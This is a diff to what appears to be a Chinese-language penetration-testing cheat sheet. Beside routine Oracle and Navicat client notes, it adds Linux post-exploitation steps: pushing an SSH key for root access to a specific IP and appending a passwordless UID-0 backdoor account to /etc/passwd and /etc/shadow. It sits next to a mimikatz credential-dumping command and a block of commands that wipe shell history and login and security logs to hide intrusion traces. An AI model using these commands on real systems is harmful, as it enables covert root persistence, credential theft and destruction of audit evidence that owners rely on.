@@ -388,6 +388,17 @@ https://dev.mysql.com/downloads/mysql/
 mysqld --initialize-insecure
 mysqld
 mysql -uroot -p123456
+
+Oracle：
+http://www.oracle.com/technetwork/database/features/instant-client/index.html
+----
+export ORACLE_HOME=/u01/oracle/product/11.2.0/db_1
+export PATH=$PATH:$ORACLE_HOME/bin
+----
+sqlplus username/password@127.0.0.1:1521/cqsfjwdb
+
+Navicat：
+http://download3.navicat.com/download/navicat120_premium_cs_x64.exe
 ```
 
 ## Wget 递归下载
@@ -830,14 +841,22 @@ https://github.com/gentilkiwi/mimikatz
 -----
 mimikatz.exe "log 123.log" version hostname privilege::debug sekurlsa::logonpasswords exit
 
+Linux：
+1. 上传公钥
+ssh-copy-id root@219.221.10.50
+ssh root@219.221.10.50
+2. 添加账号
+echo "sqnuid:x:0:0::/:/bin/bash" >> /etc/passwd
+echo "sqnuid::::::::" >> /etc/shadow
+
 Linux 清空痕迹：
 unset HISTFILE
-echo > /root/.bash_history
 echo > /var/run/utmp
 echo > /var/log/wtmp
 echo > /var/log/btmp
 echo > /var/log/secure
 echo > /var/log/lastlog
+echo > /root/.bash_history
 ```
 
 ```bash
